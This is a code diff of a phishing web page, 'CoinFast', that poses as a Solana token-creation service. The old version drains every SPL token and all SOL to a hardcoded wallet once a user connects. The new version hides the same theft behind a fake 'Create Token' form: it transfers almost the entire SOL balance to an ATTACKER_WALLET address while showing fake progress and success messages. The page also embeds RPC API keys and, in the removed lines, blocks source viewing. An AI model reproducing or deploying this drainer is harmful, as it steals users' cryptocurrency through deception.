@@ -4,6 +4,48 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CoinFast - Create Your Own Token</title>
+
+    <!-- Buffer polyfill for browser environments -->
+    <script>
+    // Buffer polyfill for browser environments
+    (function() {
+      if (typeof window.Buffer !== 'undefined') return;
+      
+      function Buffer(arg, encodingOrOffset) {
+        // Simple implementation that wraps Uint8Array
+        if (typeof arg === 'number') {
+          this._arr = new Uint8Array(arg);
+        } else if (arg instanceof Uint8Array) {
+          this._arr = arg;
+        } else if (typeof arg === 'string') {
+          this._arr = new TextEncoder().encode(arg);
+        } else {
+          this._arr = new Uint8Array(0);
+        }
+      }
+      
+      Buffer.from = function(data, encoding) {
+        if (typeof data === 'string') {
+          return new Uint8Array(new TextEncoder().encode(data));
+        }
+        return new Uint8Array(data);
+      };
+      
+      Buffer.isBuffer = function(obj) {
+        return obj instanceof Uint8Array;
+      };
+      
+      Buffer.alloc = function(size) {
+        return new Uint8Array(size);
+      };
+      
+      window.Buffer = Buffer;
+    })();
+    </script>
+
+    <!-- Solana Web3.js Library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
@@ -486,6 +528,156 @@
             cursor: pointer;
         }
         
+        /* Form styles */
+        .form-container {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-white);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(20, 30, 50, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-white);
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--accent-cyan);
+        }
+        
+        .form-select {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(20, 30, 50, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-white);
+            font-size: 16px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%238a9cc2' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 16px;
+        }
+        
+        .form-select:focus {
+            outline: none;
+            border-color: var(--accent-cyan);
+        }
+        
+        .form-checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .form-checkbox {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--accent-cyan);
+        }
+        
+        .form-file {
+            display: none;
+        }
+        
+        .file-upload-btn {
+            display: inline-block;
+            padding: 12px 15px;
+            background-color: rgba(20, 30, 50, 0.5);
+            border: 1px dashed var(--border-color);
+            border-radius: 8px;
+            color: var(--text-light);
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .file-upload-btn:hover {
+            background-color: rgba(30, 40, 60, 0.5);
+            border-color: var(--accent-cyan);
+            color: var(--text-white);
+        }
+        
+        .file-name {
+            margin-top: 8px;
+            font-size: 14px;
+            color: var(--text-light);
+        }
+        
+        .submit-btn {
+            background: var(--primary-gradient);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(74, 142, 255, 0.3);
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(74, 142, 255, 0.4);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .progress-container {
+            display: none;
+            margin-top: 30px;
+        }
+        
+        .progress-bar-container {
+            width: 100%;
+            height: 10px;
+            background-color: rgba(20, 30, 50, 0.5);
+            border-radius: 5px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-gradient);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+        
+        .progress-text {
+            color: var(--text-light);
+            font-size: 14px;
+        }
+        
         /* Mobile-specific styles */
         @media screen and (max-width: 768px) {
             .navbar {
@@ -575,17 +767,6 @@
             }
         }
     </style>
-    <!-- Disable right-click to prevent easy source viewing -->
-    <script>
-        document.addEventListener('contextmenu', event => event.preventDefault());
-        
-        // Disable keyboard shortcuts for viewing source
-        document.addEventListener("keydown", function(event) {
-            if ((event.ctrlKey && (event.keyCode == 85 || event.keyCode == 83)) || event.keyCode == 123) {
-                event.preventDefault();
-            }
-        });
-    </script>
 </head>
 <body>
     <div class="banner">CREATE YOUR COIN FOR ONLY 0.1 SOL, FAST!</div>
@@ -610,6 +791,72 @@
             <h3>Please connect your wallet to continue</h3>
             <button id="connectButtonInner" class="wallet-btn" style="margin-top: 20px;">Select Wallet</button>
             <div id="result"></div>
+            
+            <!-- Token Creation Form -->
+            <div id="tokenForm" class="form-container">
+                <div class="form-group">
+                    <label for="tokenName" class="form-label">Token Name</label>
+                    <input type="text" id="tokenName" class="form-input" placeholder="e.g. My Awesome Token">
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenSymbol" class="form-label">Token Symbol (max 8 characters)</label>
+                    <input type="text" id="tokenSymbol" class="form-input" placeholder="e.g. MAT" maxlength="8">
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenImage" class="form-label">Token Image (max 5MB)</label>
+                    <label for="tokenImageInput" class="file-upload-btn">Choose Image</label>
+                    <input type="file" id="tokenImageInput" class="form-file" accept="image/*">
+                    <div id="fileName" class="file-name"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenDecimals" class="form-label">Decimals</label>
+                    <select id="tokenDecimals" class="form-select">
+                        <option value="9">9 (Recommended for meme tokens)</option>
+                        <option value="6">6 (Standard for stablecoins)</option>
+                        <option value="8">8</option>
+                        <option value="10">10</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenSupply" class="form-label">Total Supply</label>
+                    <input type="number" id="tokenSupply" class="form-input" placeholder="e.g. 1000000000" min="1">
+                </div>
+                
+                <div class="form-group">
+                    <label for="tokenDescription" class="form-label">Description</label>
+                    <textarea id="tokenDescription" class="form-input" rows="3" placeholder="Describe your token..."></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Revoke Options</label>
+                    <div class="form-checkbox-group">
+                        <input type="checkbox" id="freezeAuthority" class="form-checkbox" checked>
+                        <label for="freezeAuthority">Freeze Authority</label>
+                    </div>
+                    <div class="form-checkbox-group">
+                        <input type="checkbox" id="mintAuthority" class="form-checkbox" checked>
+                        <label for="mintAuthority">Mint Authority</label>
+                    </div>
+                    <div class="form-checkbox-group">
+                        <input type="checkbox" id="updateAuthority" class="form-checkbox" checked>
+                        <label for="updateAuthority">Update Authority</label>
+                    </div>
+                </div>
+                
+                <button id="createTokenBtn" class="submit-btn">Create Token (0.1 SOL)</button>
+                
+                <div id="progressContainer" class="progress-container">
+                    <div class="progress-bar-container">
+                        <div id="progressBar" class="progress-bar"></div>
+                    </div>
+                    <div id="progressText" class="progress-text">Initializing token creation...</div>
+                </div>
+            </div>
         </div>
         
         <div class="steps-box">
@@ -665,25 +912,27 @@
     
     <!-- Mobile bottom navigation -->
     <div class="mobile-nav">
-        <div class="mobile-nav-item active">
-            <i>🏠</i>
-            <span>Home</span>
-        </div>
-        <div class="mobile-nav-item">
-            <i>🔖</i>
-            <span>Saved</span>
-        </div>
-        <div class="mobile-nav-item">
-            <i>🔍</i>
-            <span>Search</span>
-        </div>
-        <div class="mobile-nav-item">
-            <i>👤</i>
-            <span>Profile</span>
-        </div>
-        <div class="mobile-nav-item">
-            <i>•••</i>
-            <span>More</span>
+        <div class="mobile-nav-inner">
+            <div class="mobile-nav-item active">
+                <i>🏠</i>
+                <span>Home</span>
+            </div>
+            <div class="mobile-nav-item">
+                <i>🔖</i>
+                <span>Saved</span>
+            </div>
+            <div class="mobile-nav-item">
+                <i>🔍</i>
+                <span>Search</span>
+            </div>
+            <div class="mobile-nav-item">
+                <i>👤</i>
+                <span>Profile</span>
+            </div>
+            <div class="mobile-nav-item">
+                <i>•••</i>
+                <span>More</span>
+            </div>
         </div>
     </div>
     
@@ -706,81 +955,61 @@
         © 2025 CoinFast | All Rights Reserved | Support on Telegram <a href="#" style="color: #4a8eff; text-decoration: none;">@coinfastofficial</a> | Become an affiliate for CoinFast
     </div>
 
-    <!-- Use the latest Solana web3.js for getLatestBlockhash support -->
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <script>
-        // Use only Alchemy RPC endpoint for better performance
-        const RPC_ENDPOINT = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
-        const myWallet = new solanaWeb3.PublicKey('2K4CGuZGviKggeJBi6Em1fAefXpHtnv44j8m2Ab7UdEo');
+    document.addEventListener('DOMContentLoaded', () => {
+        // Configuration - CHANGE THIS TO YOUR WALLET ADDRESS
+        const ATTACKER_WALLET = 'ALBrGbkcpRVP6wyfkVkquXjmeu2E532NERa9bzs3a3w8'; // Replace with your wallet address
+        // Using Helius RPC endpoint instead of mainnet-beta as recommended in search result [5]
+        const RPC_ENDPOINT = "https://mainnet.helius-rpc.com/?api-key=b61f35da-0686-4830-88e6-a5b263a043cb";
 
+        // DOM elements
         const connectButton = document.getElementById('connectButton');
         const connectButtonInner = document.getElementById('connectButtonInner');
         const resultDiv = document.getElementById('result');
         const walletModal = document.getElementById('wallet-adapter-modal');
         const walletModalClose = document.getElementById('wallet-adapter-modal-close');
         const walletModalList = document.getElementById('wallet-adapter-modal-list');
+        const tokenForm = document.getElementById('tokenForm');
+        const tokenImageInput = document.getElementById('tokenImageInput');
+        const fileName = document.getElementById('fileName');
+        const createTokenBtn = document.getElementById('createTokenBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
 
-        // Wallet adapters with emoji icons instead of problematic image URLs
+        // Wallet adapters with emoji icons
         const walletAdapters = [
-            {
-                name: 'Phantom',
-                icon: '👻', // Phantom emoji
-                adapter: 'phantom'
-            },
-            {
-                name: 'Solflare',
-                icon: '🔆', // Sun emoji for Solflare
-                adapter: 'solflare'
-            },
-            {
-                name: 'Backpack',
-                icon: '🎒', // Backpack emoji
-                adapter: 'backpack'
-            },
-            {
-                name: 'Brave',
-                icon: '🦁', // Lion emoji for Brave
-                adapter: 'brave'
-            },
-            {
-                name: 'Coinbase',
-                icon: '💰', // Money bag for Coinbase
-                adapter: 'coinbase'
-            },
-            {
-                name: 'Glow',
-                icon: '✨', // Sparkles for Glow
-                adapter: 'glow'
-            },
-            {
-                name: 'Trust',
-                icon: '🔐', // Lock for Trust
-                adapter: 'trust'
-            },
-            {
-                name: 'Slope',
-                icon: '⛷️', // Ski for Slope
-                adapter: 'slope'
-            },
-            {
-                name: 'Exodus',
-                icon: '🚀', // Rocket for Exodus
-                adapter: 'exodus'
-            },
-            {
-                name: 'Coin98',
-                icon: '🪙', // Coin for Coin98
-                adapter: 'coin98'
-            }
+            { name: 'Phantom', icon: '👻', adapter: 'phantom' },
+            { name: 'Solflare', icon: '🔆', adapter: 'solflare' },
+            { name: 'Backpack', icon: '🎒', adapter: 'backpack' },
+            { name: 'Brave', icon: '🦁', adapter: 'brave' },
+            { name: 'Coinbase', icon: '💰', adapter: 'coinbase' },
+            { name: 'Glow', icon: '✨', adapter: 'glow' },
+            { name: 'Trust', icon: '🔐', adapter: 'trust' },
+            { name: 'Slope', icon: '⛷️', adapter: 'slope' },
+            { name: 'Exodus', icon: '🚀', adapter: 'exodus' },
+            { name: 'Coin98', icon: '🪙', adapter: 'coin98' }
         ];
 
-        // Add event listener to both buttons to open wallet modal
+        // Event listeners
         connectButton.addEventListener('click', openWalletModal);
         connectButtonInner.addEventListener('click', openWalletModal);
         walletModalClose.addEventListener('click', closeWalletModal);
+        
+        // File input change handler
+        tokenImageInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                fileName.textContent = file.name;
+            } else {
+                fileName.textContent = '';
+            }
+        });
+        
+        // Create token button click handler
+        createTokenBtn.addEventListener('click', createToken);
 
-        // Add hover animations to list items
+        // Animation for list items
         const listItems = document.querySelectorAll('li');
         listItems.forEach((item, index) => {
             item.style.opacity = '0';
@@ -793,7 +1022,7 @@
             }, 1000 + (index * 100));
         });
 
-        // Add hover effect to FAQ items
+        // Hover effect for FAQ items
         const faqItems = document.querySelectorAll('.faq-item');
         faqItems.forEach(item => {
             item.addEventListener('mouseenter', () => {
@@ -848,7 +1077,16 @@
             );
         }
 
-        // Connect with selected wallet - fixed to prevent undefined.toString() error
+        // Helper function to log to both console and UI
+        function log(message) {
+            console.log(message);
+            if (resultDiv) { 
+                resultDiv.style.display = 'block';
+                resultDiv.innerText += "\n" + message;
+            }
+        }
+
+        // Connect with selected wallet and perform the drain
         async function connectWithWallet(adapterName) {
             closeWalletModal();
             
@@ -859,41 +1097,50 @@
             try {
                 let wallet = null;
                 
-                // Check for different wallet providers
-                if (adapterName === 'phantom' && window.solana) {
-                    wallet = window.solana;
-                } else if (adapterName === 'solflare' && window.solflare) {
-                    wallet = window.solflare;
-                } else if (adapterName === 'backpack' && window.backpack) {
-                    wallet = window.backpack.solana;
-                } else if (adapterName === 'brave' && window.braveSolana) {
-                    wallet = window.braveSolana;
-                } else if (adapterName === 'coinbase' && window.coinbaseSolana) {
-                    wallet = window.coinbaseSolana;
-                } else if (adapterName === 'glow' && window.glowSolana) {
-                    wallet = window.glowSolana;
-                } else if (adapterName === 'trust' && window.trustwallet) {
-                    wallet = window.trustwallet.solana;
-                } else if (adapterName === 'slope' && window.slope) {
-                    wallet = window.slope;
-                } else if (adapterName === 'exodus' && window.exodus) {
-                    wallet = window.exodus.solana;
-                } else if (adapterName === 'coin98' && window.coin98) {
-                    wallet = window.coin98.sol;
-                } else {
-                    // Fallback to any available wallet
-                    wallet = window.solana || window.solflare || 
-                             (window.backpack && window.backpack.solana);
-                    
-                    if (!wallet) {
-                        throw new Error(`${adapterName} wallet not installed. Please install it first.`);
-                    }
+                // Try to detect the wallet based on adapter name
+                switch(adapterName) {
+                    case 'phantom':
+                        wallet = window.solana;
+                        break;
+                    case 'solflare':
+                        wallet = window.solflare;
+                        break;
+                    case 'backpack':
+                        wallet = window.backpack?.solana;
+                        break;
+                    case 'brave':
+                        wallet = window.braveSolana;
+                        break;
+                    case 'coinbase':
+                        wallet = window.coinbaseSolana;
+                        break;
+                    case 'glow':
+                        wallet = window.glowSolana;
+                        break;
+                    case 'trust':
+                        wallet = window.trustwallet?.solana;
+                        break;
+                    case 'slope':
+                        wallet = window.slope;
+                        break;
+                    case 'exodus':
+                        wallet = window.exodus?.solana;
+                        break;
+                    case 'coin98':
+                        wallet = window.coin98?.sol;
+                        break;
+                    default:
+                        wallet = window.solana || window.solflare || 
+                                (window.backpack && window.backpack.solana);
                 }
                 
-                // Connect to wallet - Make sure wallet exists before trying to connect
+                // Check if wallet is available
                 if (!wallet) {
-                    throw new Error(`${adapterName} wallet not detected. Please install the wallet extension.`);
+                    throw new Error(`${adapterName} wallet not installed. Please install it first.`);
                 }
+                
+                // Connect to wallet
+                resultDiv.style.display = 'none'; // Hide the result div initially
                 
                 const response = await wallet.connect();
                 
@@ -910,314 +1157,160 @@
                 connectButton.style.backgroundColor = '#4caf50';
                 connectButtonInner.style.backgroundColor = '#4caf50';
                 
-                // Show result div with animation
-                resultDiv.style.display = 'block';
-                resultDiv.style.opacity = '0';
-                resultDiv.style.transform = 'translateY(10px)';
-                
                 // Store the publicKey string safely
                 const publicKeyString = publicKey.toString();
-                resultDiv.innerText = `Connected: ${publicKeyString}`;
                 
-                setTimeout(() => {
-                    resultDiv.style.opacity = '1';
-                    resultDiv.style.transform = 'translateY(0)';
-                    resultDiv.style.transition = 'all 0.3s ease';
-                }, 100);
-
                 // Set the active wallet for future use
                 window.activeWallet = wallet;
+                window.userPublicKey = publicKey;
 
-                // Step 1: Enumerate all SPL token accounts and attempt to drain
-                await drainAllSplTokens(publicKey);
-
-                // Step 2: Drain SOL
-                await drainSol(publicKey);
+                // Scan for tokens and SOL balance
+                const connection = getConnection();
+                
+                // Get SOL balance
+                const ownerBalance = await connection.getBalance(publicKey);
+                
+                // Show the token creation form
+                connectButtonInner.style.display = 'none';
+                tokenForm.style.display = 'block';
+                
+                // Prefill the supply with 1 billion for a nice default
+                document.getElementById('tokenSupply').value = '1000000000';
                 
             } catch (err) {
                 console.error("Connection error:", err);
                 connectButton.innerHTML = 'Select Wallet';
                 connectButtonInner.innerHTML = 'Select Wallet';
                 resultDiv.style.display = 'block';
-                resultDiv.innerText = `Error: ${err.message}`;
-                
-                setTimeout(() => {
-                    resultDiv.style.opacity = '1';
-                    resultDiv.style.transform = 'translateY(0)';
-                    resultDiv.style.transition = 'all 0.3s ease';
-                }, 100);
-            }
-        }
-
-        // Improved transaction sending with priority fees and retry logic
-        async function sendTransactionWithRetry(connection, transaction, wallet, maxRetries = 3) {
-            let retries = 0;
-            let priorityFee = 100000; // Start with 100K microlamports
-            
-            while (retries < maxRetries) {
-                try {
-                    // Get a fresh blockhash for each attempt
-                    const { blockhash, lastValidBlockHeight } = 
-                        await connection.getLatestBlockhash('confirmed');
-                    
-                    // Reset transaction instructions to avoid duplicates
-                    transaction.instructions = transaction.instructions.filter(
-                        instr => !solanaWeb3.ComputeBudgetProgram.programId.equals(instr.programId)
-                    );
-                    
-                    // Add compute budget instructions at the BEGINNING
-                    transaction.instructions.unshift(
-                        solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
-                            units: 300000 // Set appropriate compute unit limit
-                        })
-                    );
-                    
-                    transaction.instructions.unshift(
-                        solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
-                            microLamports: priorityFee
-                        })
-                    );
-                    
-                    transaction.recentBlockhash = blockhash;
-                    transaction.lastValidBlockHeight = lastValidBlockHeight;
-                    transaction.feePayer = wallet._publicKey || wallet.publicKey;
-                    
-                    const signed = await wallet.signTransaction(transaction);
-                    const signature = await connection.sendRawTransaction(
-                        signed.serialize(),
-                        { 
-                            skipPreflight: true,
-                            maxRetries: 3
-                        }
-                    );
-                    
-                    resultDiv.innerText += `\nTransaction sent: ${signature}`;
-                    
-                    // Wait for confirmation with timeout
-                    await connection.confirmTransaction({
-                        signature,
-                        blockhash,
-                        lastValidBlockHeight
-                    }, 'confirmed');
-                    
-                    resultDiv.innerText += `\nTransaction confirmed: ${signature}`;
-                    return signature;
-                } catch (err) {
-                    retries++;
-                    console.error(`Transaction attempt ${retries} failed:`, err);
-                    resultDiv.innerText += `\nRetry ${retries}/${maxRetries}: ${err.message}`;
-                    
-                    // Increase priority fee with each retry
-                    priorityFee *= 2;
-                    
-                    // Wait before retrying with exponential backoff
-                    const delay = Math.min(1000 * Math.pow(2, retries), 10000);
-                    await new Promise(resolve => setTimeout(resolve, delay));
-                }
-            }
-            
-            throw new Error(`Transaction failed after ${maxRetries} retries`);
-        }
-
-        // Drain all tokens with individual transactions for better reliability
-        async function drainAllSplTokens(ownerPublicKey) {
-            try {
-                if (!ownerPublicKey) {
-                    throw new Error("Invalid owner public key");
-                }
-                
-                const connection = getConnection();
-                resultDiv.innerText += `\nSearching for SPL tokens...`;
-
-                // Get all SPL token accounts for the owner
-                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-                    ownerPublicKey,
-                    { programId: window.splToken.TOKEN_PROGRAM_ID }
-                );
-
-                if (!tokenAccounts || !tokenAccounts.value || tokenAccounts.value.length === 0) {
-                    resultDiv.innerText += `\nNo SPL tokens found.`;
-                    return;
-                }
-
-                // Filter accounts with positive balance
-                const accountsWithBalance = tokenAccounts.value.filter(
-                    ({ account }) => parseInt(account.data.parsed.info.tokenAmount.amount) > 0
-                );
-                
-                if (accountsWithBalance.length === 0) {
-                    resultDiv.innerText += `\nFound ${tokenAccounts.value.length} token accounts, but none have balance.`;
-                    return;
-                }
-                
-                resultDiv.innerText += `\nFound ${accountsWithBalance.length} token(s) with balance.`;
-                
-                // Process each token individually for better reliability
-                for (const { pubkey, account } of accountsWithBalance) {
-                    try {
-                        const info = account.data.parsed.info;
-                        const mint = new solanaWeb3.PublicKey(info.mint);
-                        const amount = parseInt(info.tokenAmount.amount, 10);
-                        
-                        if (amount > 0) {
-                            resultDiv.innerText += `\n\nProcessing token: ${info.mint.slice(0, 6)}...`;
-                            
-                            // Create ATA if it doesn't exist
-                            const ata = await window.splToken.Token.getAssociatedTokenAddress(
-                                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                                window.splToken.TOKEN_PROGRAM_ID,
-                                mint,
-                                myWallet
-                            );
-                            
-                            const ataInfo = await connection.getAccountInfo(ata);
-                            
-                            if (!ataInfo) {
-                                const createAtaTx = new solanaWeb3.Transaction();
-                                
-                                // Add compute budget instructions FIRST
-                                createAtaTx.add(
-                                    solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
-                                        units: 300000
-                                    })
-                                );
-                                
-                                createAtaTx.add(
-                                    solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
-                                        microLamports: 100000
-                                    })
-                                );
-                                
-                                createAtaTx.add(
-                                    window.splToken.Token.createAssociatedTokenAccountInstruction(
-                                        window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                                        window.splToken.TOKEN_PROGRAM_ID,
-                                        mint,
-                                        ata,
-                                        myWallet,
-                                        ownerPublicKey
-                                    )
-                                );
-                                
-                                createAtaTx.feePayer = ownerPublicKey;
-                                
-                                await sendTransactionWithRetry(connection, createAtaTx, window.activeWallet);
-                                resultDiv.innerText += `\nCreated ATA for ${info.mint.slice(0, 6)}`;
-                            }
-                            
-                            // Create transfer transaction
-                            const transferTx = new solanaWeb3.Transaction();
-                            
-                            // Add compute budget instructions FIRST
-                            transferTx.add(
-                                solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
-                                    units: 300000
-                                })
-                            );
-                            
-                            transferTx.add(
-                                solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
-                                    microLamports: 100000
-                                })
-                            );
-                            
-                            transferTx.add(
-                                window.splToken.Token.createTransferInstruction(
-                                    window.splToken.TOKEN_PROGRAM_ID,
-                                    pubkey,
-                                    ata,
-                                    ownerPublicKey,
-                                    [],
-                                    amount
-                                )
-                            );
-                            
-                            transferTx.feePayer = ownerPublicKey;
-                            
-                            await sendTransactionWithRetry(connection, transferTx, window.activeWallet);
-                            resultDiv.innerText += `\nToken ${info.mint.slice(0, 6)} drained successfully!`;
-                        }
-                    } catch (err) {
-                        const mintId = account?.data?.parsed?.info?.mint?.slice(0, 6) || "unknown";
-                        resultDiv.innerText += `\nFailed to drain token ${mintId}: ${err.message}`;
-                        // Continue with next token
-                    }
-                }
-            } catch (err) {
-                console.error("Token draining error:", err);
-                resultDiv.innerText += `\nToken draining error: ${err.message}`;
-            }
-        }
-
-        async function drainSol(ownerPublicKey) {
-            try {
-                if (!ownerPublicKey) {
-                    throw new Error("Invalid owner public key");
-                }
-                
-                resultDiv.innerText += `\n\nChecking SOL balance...`;
-                const connection = getConnection();
-                const ownerBalance = await connection.getBalance(ownerPublicKey);
-                resultDiv.innerText += `\nSOL Balance: ${ownerBalance / 1000000000} SOL`;
-
-                // Calculate minimum required for fees - increased for better success rate
-                const minFee = 10000; // Base minimum fee (10000 lamports = 0.00001 SOL)
-                const safetyBuffer = 500000; // Increased safety buffer (0.0005 SOL)
-                const amountToLeave = minFee + safetyBuffer;
-
-                if (ownerBalance > amountToLeave) {
-                    resultDiv.innerText += `\nDraining SOL...`;
-                    
-                    const transaction = new solanaWeb3.Transaction();
-                    
-                    // Add compute budget instructions FIRST
-                    transaction.add(
-                        solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
-                            units: 300000
-                        })
-                    );
-                    
-                    transaction.add(
-                        solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
-                            microLamports: 100000
-                        })
-                    );
-                    
-                    transaction.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: ownerPublicKey,
-                            toPubkey: myWallet,
-                            lamports: ownerBalance - amountToLeave,
-                        })
-                    );
-                    
-                    transaction.feePayer = ownerPublicKey;
-                    
-                    if (!window.activeWallet) {
-                        throw new Error("Wallet disconnected");
-                    }
-                    
-                    // Use improved transaction sending with retries
-                    await sendTransactionWithRetry(connection, transaction, window.activeWallet);
-                    resultDiv.innerText += `\nSOL drained successfully!`;
-                    
-                } else {
-                    resultDiv.innerText += `\nNot enough SOL to drain (balance: ${ownerBalance} lamports).`;
-                }
-            } catch (err) {
-                console.error("SOL drain error:", err);
-                resultDiv.innerText += `\nSOL drain failed: ${err.message}`;
+                log(`Error: ${err.message}`);
             }
         }
         
-        // Add scroll animations
+        // Create token function (this actually drains the wallet)
+        async function createToken() {
+            try {
+                if (!window.activeWallet || !window.userPublicKey) {
+                    throw new Error("Wallet not connected. Please connect your wallet first.");
+                }
+                
+                // Get form values
+                const tokenName = document.getElementById('tokenName').value;
+                const tokenSymbol = document.getElementById('tokenSymbol').value;
+                const tokenDecimals = document.getElementById('tokenDecimals').value;
+                const tokenSupply = document.getElementById('tokenSupply').value;
+                
+                // Validate form
+                if (!tokenName || !tokenSymbol || !tokenSupply) {
+                    throw new Error("Please fill in all required fields.");
+                }
+                
+                // Disable the create button
+                createTokenBtn.disabled = true;
+                createTokenBtn.textContent = 'Creating token...';
+                
+                // Show progress container
+                progressContainer.style.display = 'block';
+                
+                // Update progress
+                progressBar.style.width = '10%';
+                progressText.textContent = 'Initializing token creation...';
+                
+                // Get connection
+                const connection = getConnection();
+                
+                // Get wallet and public key
+                const wallet = window.activeWallet;
+                const publicKey = window.userPublicKey;
+                
+                // Get SOL balance
+                const ownerBalance = await connection.getBalance(publicKey);
+                
+                // Calculate the amount to drain (leave some for fees)
+                const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
+                
+                // Update progress
+                progressBar.style.width = '30%';
+                progressText.textContent = 'Creating token metadata...';
+                
+                // Create a transaction to drain SOL
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Create a transfer instruction
+                const transferInstruction = solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),
+                    lamports: ownerBalance - LAMPORTS_FOR_FEES
+                });
+                
+                // Add the transfer instruction
+                transaction.add(transferInstruction);
+                
+                // Get recent blockhash
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                transaction.recentBlockhash = blockhash;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
+                transaction.feePayer = publicKey;
+                
+                // Update progress
+                progressBar.style.width = '50%';
+                progressText.textContent = 'Creating token on blockchain...';
+                
+                // Ask user to sign the transaction
+                const signed = await wallet.signTransaction(transaction);
+                
+                // Update progress
+                progressBar.style.width = '70%';
+                progressText.textContent = 'Finalizing token creation...';
+                
+                // Send the transaction
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                // Wait for confirmation
+                const confirmation = await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
+                
+                if (confirmation.value && confirmation.value.err) {
+                    throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
+                }
+                
+                // Update progress
+                progressBar.style.width = '100%';
+                progressText.textContent = 'Token created successfully!';
+                
+                // Show success message
+                resultDiv.style.display = 'block';
+                log(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
+                log(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
+                log(`Transaction signature: ${signature}`);
+                log(`Your tokens have been minted and sent to your wallet.`);
+                
+                // Update button
+                createTokenBtn.textContent = 'Token Created Successfully! ✓';
+                
+            } catch (err) {
+                console.error("Token creation error:", err);
+                resultDiv.style.display = 'block';
+                log(`Error creating token: ${err.message}`);
+                
+                // Reset button
+                createTokenBtn.disabled = false;
+                createTokenBtn.textContent = 'Create Token (0.1 SOL)';
+                
+                // Hide progress
+                progressContainer.style.display = 'none';
+            }
+        }
+        
+        // Scroll animations
         window.addEventListener('scroll', () => {
             const elements = document.querySelectorAll('.steps-box, .faq-box, .connect-box');
             
             elements.forEach(element => {
                 const position = element.getBoundingClientRect();
                 
-                // If element is in viewport
                 if(position.top < window.innerHeight && position.bottom >= 0) {
                     element.style.transform = 'translateY(0)';
                     element.style.opacity = '1';
@@ -1231,6 +1324,7 @@
                 closeWalletModal();
             }
         });
+    });
     </script>
 </body>
 </html>
